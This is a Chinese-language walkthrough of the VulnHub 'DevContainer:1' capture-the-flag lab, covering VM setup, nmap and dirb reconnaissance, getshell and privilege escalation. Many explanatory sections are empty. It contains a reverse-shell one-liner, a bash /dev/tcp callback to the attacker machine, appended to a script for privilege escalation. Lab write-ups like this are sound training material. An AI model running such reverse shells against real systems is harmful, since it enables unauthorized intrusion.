# 原创
：  VulnHub渗透测试实战靶场 - DevContainer：1

# VulnHub渗透测试实战靶场 - DevContainer：1

#### VulnHub渗透测试实战靶场 - DevContainer：1

## 题目描述

```
Goal: 2 flagas
Difficulty: Easy-intermediate
Information: Your feedback is appreciate:
Twitter: @0x04E1

This works better with VirtualBox rather than VMware

```

## 环境下载

> 



## DevContainer：1靶机搭建

> 

- 将下载好的靶机环境，导入 VritualBox，设置为 Host-Only 模式- 将 VMware 中桥接模式网卡设置为 VritualBox 的 Host-only


> 



## 渗透测试

### 信息搜集

> 
用 Nmap 扫描一下目标靶机的端口信息：`sudo nmap -sS -A 192.168.56.108`，发现开放了 80 端口


> 
用 dirb 扫描一下 80 端口 web 目录：`dirb http://192.168.56.108`


### 漏洞挖掘

> 



> 



### getshell

> 



> 



```
SHELL=/bin/bash script -q /dev/null

```

### 提权

> 



> 



```
echo "bash -i &gt;&amp; /dev/tcp/192.168.56.102/4444 0&gt;&amp;1" &gt;&gt; list.sh

```

> 



#### Flag-1

> 



> 



> 



> 



#### Flag-2

> 


